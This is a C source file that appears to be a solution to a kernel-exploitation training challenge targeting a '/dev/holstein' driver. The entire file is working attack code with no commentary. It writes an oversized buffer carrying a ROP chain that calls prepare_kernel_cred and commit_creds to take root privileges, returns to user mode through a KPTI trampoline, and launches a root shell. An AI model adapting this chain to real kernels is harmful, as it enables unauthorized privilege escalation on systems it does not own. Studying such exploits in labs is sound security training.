#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>

#define commit_creds 0xffffffff8106e390
#define prepare_kernel_cred 0xffffffff8106e240
#define kbase 0xffffffff81000000
/*pwndbg> x/gx &commit_creds
0xffffffff8106e390 <commit_creds>:      0x4c655541e5894855
pwndbg> x/gx &prepare_kernel_cred
0xffffffff8106e240 <prepare_kernel_cred>:       0x894800000cc0be55
pwndbg>*/

#define DEBUG

#ifdef DEBUG
#define errExit(msg)        \
    do                      \
    {                       \
        perror(msg);        \
        exit(EXIT_FAILURE); \
    } while (0)

#define WAIT()                \
    do                        \
    {                         \
        puts("[WAITING...]"); \
        getchar();            \
    } while (0)

#define logOK(msg, ...) dprintf(2, "[+] " msg "\n", ##__VA_ARGS__);
#define logInfo(msg, ...) dprintf(2, "[*] " msg "\n", ##__VA_ARGS__);
#define logErr(msg, ...) dprintf(2, "[!] " msg "\n", ##__VA_ARGS__);
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

uint64_t user_ss, user_cs, user_rsp, user_rip, user_rflags;

void get_shell() {
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    execve("/bin/sh", argv, envp);
}

void save_state() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushf;"
        "pop qword ptr [rip+user_rflags];"
        ".att_syntax"
    );
    user_rip = (uint64_t)(uintptr_t)get_shell;
}

int main() {
    save_state();
    uint64_t pop_rdi = 0xffffffff8127bbdc;
    uint64_t kpti_trampoline = 0xffffffff81800e26;
    uint64_t pop_rcx = 0xffffffff812ea083;
    uint64_t mov_rdi_rax = 0xffffffff8160c96b;
    uint64_t idx = 0;
    int fd = open("/dev/holstein", O_RDWR);
    if (fd < 0) {
        perror("open");
        return -1;
    }

    char payload[0x500];
    memset(payload, 'A', sizeof(payload));
    uint64_t *rop = (uint64_t *)(payload + 0x408);
    rop[idx++] = pop_rdi;
    rop[idx++] = 0;
    rop[idx++] = prepare_kernel_cred;
    rop[idx++] = pop_rcx;
    rop[idx++] = 0;
    rop[idx++] = mov_rdi_rax;
    rop[idx++] = commit_creds;
    rop[idx++] = kpti_trampoline;
    rop[idx++] = 0;
    rop[idx++] = 0;
    rop[idx++] = user_rip;
    rop[idx++] = user_cs;
    rop[idx++] = user_rflags;
    rop[idx++] = user_rsp;
    rop[idx++] = user_ss;
    write(fd, payload, sizeof(payload));
    return 0;
}
